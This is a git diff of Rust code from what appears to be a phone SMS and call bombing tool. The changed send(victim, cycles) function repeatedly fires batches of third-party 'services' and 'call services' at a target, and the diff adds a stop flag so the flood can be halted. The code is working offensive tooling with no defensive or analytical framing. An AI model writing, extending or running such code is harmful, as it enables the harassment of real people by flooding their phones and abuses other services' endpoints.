@@ -3,14 +3,22 @@ use crate::services::{
 };
 use futures::future::join_all;
 use reqwest::{Client, Method};
-use std::time::Duration;
+use std::{
+    sync::{
+        atomic::{AtomicBool, Ordering},
+        Arc,
+    },
+    time::Duration,
+};
 
 const SERVICES_DELAY: u64 = 15;
 const CALL_SERVICES_DELAY: u64 = 30;
 
-pub async fn send(victim: Victim, cycles: u64) {
+pub async fn send(victim: Victim, cycles: u64, stop_flag: Arc<AtomicBool>) {
+    stop_flag.store(false, Ordering::Relaxed); // Сбрасываем флаг перед началом работы
     let mut workers = Vec::new();
 
+    let stop_flag_clone = Arc::clone(&stop_flag);
     let victim_clone = victim.clone();
     workers.push(tokio::spawn(async move {
         for i in 0..cycles {
@@ -20,13 +28,16 @@ pub async fn send(victim: Victim, cycles: u64) {
                 .map(|item| tokio::spawn(send_single(item)))
                 .collect();
 
-            join_all(services_futures).await;
-            if i < cycles - 1 {
+            if !stop_flag_clone.load(Ordering::Relaxed) {
+                join_all(services_futures).await;
+            }
+            if i < cycles - 1 && !stop_flag_clone.load(Ordering::Relaxed) {
                 tokio::time::sleep(Duration::from_secs(SERVICES_DELAY)).await;
             }
         }
     }));
 
+    let stop_flag_clone = Arc::clone(&stop_flag);
     workers.push(tokio::spawn(async move {
         for i in 0..cycles {
             let call_services = construct_call_services_list(victim.clone()).await;
@@ -38,16 +49,21 @@ pub async fn send(victim: Victim, cycles: u64) {
                 })
                 .collect();
 
-            for call_services_handle in call_services_futures {
-                call_services_handle.await;
+            if !stop_flag_clone.load(Ordering::Relaxed) {
+                for call_services_handle in call_services_futures {
+                    call_services_handle.await;
+                }
             }
-            if i < cycles - 1 {
+            if i < cycles - 1 && !stop_flag_clone.load(Ordering::Relaxed) {
                 tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
             }
         }
     }));
 
-    join_all(workers).await;
+    let stop_flag_clone = Arc::clone(&stop_flag);
+    if !stop_flag_clone.load(Ordering::Relaxed) {
+        join_all(workers).await;
+    }
 }
 
 async fn send_single(service: Service) {
